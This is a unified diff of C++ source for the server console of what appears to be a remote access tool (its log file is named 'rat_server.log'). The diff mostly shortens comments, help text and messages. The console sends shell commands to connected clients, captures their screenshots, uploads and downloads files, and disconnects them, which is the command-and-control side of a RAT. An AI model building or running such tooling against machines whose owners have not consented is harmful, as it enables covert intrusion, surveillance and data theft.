@@ -24,20 +24,20 @@ void ServerCommandController::start() {
     if (running_) return;
     running_ = true;
 
-    // Only use existing client connections managed by ServerManager; rely on stdin for admin input
+    
     if (isatty(STDIN_FILENO)) {
         stdinThread_ = std::make_unique<std::thread>(&ServerCommandController::stdinLoop, this);
     }
 }
 
 void ServerCommandController::handle(const nlohmann::json &packet) {
-    // Receive bash command responses and store them
+    
     std::lock_guard<std::mutex> lock(bashMtx_);
     bashResponses_.push(packet);
 }
 
-// spawn a terminal emulator (or tmux) to run innerCmd; returns pid (>0) for forked child,
-// 0 when launched in tmux, -1 on failure
+
+
 pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
     auto which_ok = [](const char *name)->bool {
         std::string cmd = std::string("which ") + name + " >/dev/null 2>&1";
@@ -163,47 +163,25 @@ std::string ServerCommandController::processLine(const std::string &line) {
 }
 
 std::string ServerCommandController::handleList() {
-    if (!manager_) return "Manager not available\n";
-    std::string reply;
+    if (!manager_) return "Error\n";
     auto clients = manager_->listClients();
-    if (clients.empty()) return "No clients connected\n";
-    reply = "Connected clients:\n";
+    if (clients.empty()) return "No clients\n";
+    std::string r = "Clients:\n";
     for (auto &c : clients) {
-        std::string ip = manager_->getClientIP(c);
-        reply += "  - " + c + " (" + ip + ")\n";
+        r += "  - " + c + " (" + manager_->getClientIP(c) + ")\n";
     }
-    return reply;
+    return r;
 }
 
 std::string ServerCommandController::handleHelp() {
-    std::string help;
-    help += "\nAvailable Commands:\n";
-    help += "==================\n";
-    help += "  help                     - Show this help message\n";
-    help += "  list                     - List all connected clients\n";
-    help += "  choose <client>          - Select a client for subsequent commands\n";
-    help += "  kill [client]            - Disconnect client (uses selected if not specified)\n";
-    help += "  killall                  - Disconnect all clients\n";
-    help += "  bash [client] <command>  - Execute shell command (uses selected if not specified)\n";
-    help += "  screenshot [client]      - Capture screenshot (uses selected if not specified)\n";
-    help += "  download [client] <remote_path> [local_path]  - Download file from client (default: .)\n";
-    help += "  upload [client] <local_path> [remote_path]    - Upload file to client (default: .)\n";
-    help += "  showlogs                 - Open log viewer in new terminal (tail -F)\n";
-    help += "  quit                     - Stop server and exit\n";
-    help += "\nWorkflow:\n";
-    help += "  1. list                  - See connected clients\n";
-    help += "  2. choose client1        - Select client1\n";
-    help += "  3. bash ls -la           - Run command on selected client\n";
-    help += "  4. screenshot            - Capture screenshot from selected client\n";
-    help += "\nExamples:\n";
-    help += "  bash client1 ls -la      - List files on client1 (explicit)\n";
-    help += "  screenshot client1       - Take screenshot from client1 (explicit)\n";
-    help += "  choose client1           - Select client1\n";
-    help += "  bash pwd                 - Show directory on selected client\n";
-    help += "  screenshot               - Take screenshot from selected client\n";
-    help += "  kill                     - Disconnect selected client\n";
-    help += "\n";
-    return help;
+    std::string h;
+    h += "\nCommands:\n";
+    h += "  list, choose <client>, kill [client], killall\n";
+    h += "  bash [client] <cmd>, screenshot [client]\n";
+    h += "  download [client] <remote> [local]\n";
+    h += "  upload [client] <local> [remote]\n";
+    h += "  showlogs, quit\n";
+    return h;
 }
 
 std::string ServerCommandController::handleChoose(const std::string &name) {
@@ -228,206 +206,121 @@ std::string ServerCommandController::handleKill(const std::string &name) {
         return "Error: No client specified and no client selected\n";
     }
     
-    // Security: validate client name
+    
     if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
         return "Error: Invalid characters in client name\n";
     }
     
-    // Send kill command to client (graceful shutdown)
+    
     if (manager_->hasClient(targetClient)) {
         nlohmann::json killCmd{{"controller", "kill"}};
         manager_->sendRequest(targetClient, killCmd);
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
     
-    // Remove client from server
-    if (manager_->removeClient(targetClient)) {
-        if (targetClient == selectedClient_) {
-            selectedClient_.clear();
-        }
-        return "Client disconnected: " + targetClient + "\n";
-    }
     
-    return "Error: Client '" + targetClient + "' not found\n";
+    if (manager_->removeClient(targetClient)) {
+        if (targetClient == selectedClient_) selectedClient_.clear();
+        return "OK\n";
+    }
+    return "Not found\n";
 }
 
 std::string ServerCommandController::handleKillAll() {
-    if (!manager_) return "Error: Manager not available\n";
-    
+    if (!manager_) return "Error\n";
     auto clients = manager_->listClients();
-    if (clients.empty()) {
-        return "No clients connected\n";
-    }
+    if (clients.empty()) return "No clients\n";
     
-    // Send kill command to all clients
     nlohmann::json killCmd{{"controller", "kill"}};
-    for (const auto &clientName : clients) {
-        manager_->sendRequest(clientName, killCmd);
-    }
-    
-    // Wait for graceful shutdown
+    for (const auto &c : clients) manager_->sendRequest(c, killCmd);
     std::this_thread::sleep_for(std::chrono::milliseconds(300));
     
-    // Remove all clients
-    int killed = 0;
-    for (const auto &clientName : clients) {
-        if (manager_->removeClient(clientName)) {
-            killed++;
-        }
-    }
-    
+    int n = 0;
+    for (const auto &c : clients) if (manager_->removeClient(c)) n++;
     selectedClient_.clear();
-    return "Disconnected " + std::to_string(killed) + " client(s)\n";
+    return "Disconnected " + std::to_string(n) + " client(s)\n";
 }
 
 std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
-    if (!manager_) return "Error: Manager not available\n";
+    if (!manager_) return "Error\n";
     
-    // Determine target client and command
-    std::string targetClient;
-    std::string command;
-    
+    std::string targetClient, command;
     if (name.empty()) {
-        if (selectedClient_.empty()) {
-            return "Error: No client specified and no client selected\n";
-        }
+        if (selectedClient_.empty()) return "No client\n";
         targetClient = selectedClient_;
         command = cmd;
     } else if (manager_->hasClient(name)) {
         targetClient = name;
         command = cmd;
     } else {
-        if (selectedClient_.empty()) {
-            return "Error: Client '" + name + "' not found and no client selected\n";
-        }
-        // Treat name as part of the command
+        if (selectedClient_.empty()) return "Not found\n";
         targetClient = selectedClient_;
         command = name + (cmd.empty() ? "" : " " + cmd);
     }
     
-    // Validate client name for security
-    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
-        return "Error: Invalid characters in client name\n";
-    }
+    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
+    if (command.empty()) return "Empty\n";
     
-    if (command.empty()) {
-        return "Error: Empty command\n";
-    }
+    nlohmann::json req{{"controller", "bash"}, {"cmd", command}};
+    if (!manager_->sendRequest(targetClient, req)) return "Failed\n";
     
-    // Send bash command request
-    nlohmann::json request{
-        {"controller", "bash"},
-        {"cmd", command}
-    };
-    
-    if (!manager_->sendRequest(targetClient, request)) {
-        return "Error: Failed to send command to " + targetClient + "\n";
-    }
-    
-    // Wait for and receive response directly
-    nlohmann::json response;
-    if (manager_->receiveResponse(targetClient, response, 5000)) {
-        if (response.contains("out") && response["out"].is_string()) {
-            std::string output = response["out"].get<std::string>();
-            int exitCode = response.contains("ret") ? response["ret"].get<int>() : -1;
-            return "Output:\n" + output + "Exit code: " + std::to_string(exitCode) + "\n";
+    nlohmann::json resp;
+    if (manager_->receiveResponse(targetClient, resp, 5000)) {
+        if (resp.contains("out") && resp["out"].is_string()) {
+            return resp["out"].get<std::string>();
         }
     }
-    
-    return "Warning: No response received (command may still be running)\n";
+    return "No response\n";
 }
 
 std::string ServerCommandController::handleScreenshot(const std::string &name) {
-    if (!manager_) return "Error: Manager not available\n";
-    
-    // Determine target client
+    if (!manager_) return "Error\n";
     std::string targetClient;
     if (name.empty()) {
-        if (selectedClient_.empty()) {
-            return "Error: No client specified and no client selected\n";
-        }
+        if (selectedClient_.empty()) return "No client\n";
         targetClient = selectedClient_;
     } else if (manager_->hasClient(name)) {
         targetClient = name;
     } else {
-        return "Error: Client '" + name + "' not found\n";
+        return "Not found\n";
     }
     
-    // Validate client name
-    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
-        return "Error: Invalid characters in client name\n";
-    }
+    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
     
-    // Send screenshot request
-    nlohmann::json request{
-        {"controller", "screenshot"},
-        {"action", "take"}
-    };
+    nlohmann::json req{{"controller", "screenshot"}, {"action", "take"}};
+    if (!manager_->sendRequest(targetClient, req)) return "Failed\n";
     
-    if (!manager_->sendRequest(targetClient, request)) {
-        return "Error: Failed to send screenshot request to " + targetClient + "\n";
-    }
+    nlohmann::json resp;
+    if (!manager_->receiveResponse(targetClient, resp, 10000)) return "Timeout\n";
+    if (!resp.contains("success") || !resp["success"].get<bool>()) return "Failed\n";
+    if (!resp.contains("data")) return "No data\n";
     
-    // Wait for response with screenshot data
-    nlohmann::json response;
-    if (!manager_->receiveResponse(targetClient, response, 10000)) {
-        return "Error: Timeout waiting for screenshot from " + targetClient + "\n";
-    }
+    std::string b64 = resp["data"].get<std::string>();
+    std::string img;
     
-    // Check response
-    if (!response.contains("success") || !response["success"].get<bool>()) {
-        std::string error = response.contains("error") ? response["error"].get<std::string>() : "Unknown error";
-        return "Screenshot failed: " + error + "\n";
-    }
-    
-    if (!response.contains("data")) {
-        return "Error: Response missing screenshot data\n";
-    }
-    
-    // Decode base64 screenshot data
-    std::string base64Data = response["data"].get<std::string>();
-    std::string imageData;
-    
-    // Simple base64 decode
-    static const std::string base64_chars = 
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        "abcdefghijklmnopqrstuvwxyz"
-        "0123456789+/";
-    
+    static const std::string b64c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     int val = 0, valb = -8;
-    for (unsigned char c : base64Data) {
+    for (unsigned char c : b64) {
         if (c == '=') break;
         if (std::isspace(c)) continue;
-        
-        size_t pos = base64_chars.find(c);
+        size_t pos = b64c.find(c);
         if (pos == std::string::npos) continue;
-        
         val = (val << 6) + pos;
         valb += 6;
         if (valb >= 0) {
-            imageData.push_back(char((val >> valb) & 0xFF));
+            img.push_back(char((val >> valb) & 0xFF));
             valb -= 8;
         }
     }
     
-    // Save screenshot to /tmp with timestamp
-    auto now = std::chrono::system_clock::now();
-    auto timestamp = std::chrono::system_clock::to_time_t(now);
-    std::string filename = "/tmp/screenshot_" + targetClient + "_" + std::to_string(timestamp) + ".png";
-    
-    std::ofstream outFile(filename, std::ios::binary);
-    if (!outFile) {
-        return "Error: Failed to save screenshot to " + filename + "\n";
-    }
-    
-    outFile.write(imageData.data(), imageData.size());
-    outFile.close();
-    
-    // Open image with default viewer
-    std::string openCmd = "xdg-open '" + filename + "' 2>/dev/null &";
-    system(openCmd.c_str());
-    
-    return "Screenshot saved to " + filename + "\n";
+    auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+    std::string fn = "/tmp/ss_" + targetClient + "_" + std::to_string(t) + ".png";
+    std::ofstream of(fn, std::ios::binary);
+    if (!of) return "Save failed\n";
+    of.write(img.data(), img.size());
+    of.close();
+    system(("xdg-open '" + fn + "' 2>/dev/null &").c_str());
+    return "OK\n";
 }
 
 bool ServerCommandController::popBashResponse(nlohmann::json &out, int timeoutMs) {
@@ -473,7 +366,7 @@ std::string ServerCommandController::handleShowLogs() {
         logPath = "/tmp/rat_server.log";
     }
     
-    // Launch terminal with tail -F command
+    
     std::string cmd = "tail -F " + logPath + "; exec bash";
     pid_t pid = spawnTerminal(cmd);
     
@@ -490,7 +383,7 @@ std::string ServerCommandController::handleShowLogs() {
     return "Launched log viewer in terminal (PID: " + std::to_string(pid) + ")\n";
 }
 
-// adminLoop removed: we use existing client connections via ServerManager and stdin for commands
+
 
 void ServerCommandController::stdinLoop() {
     std::string line;
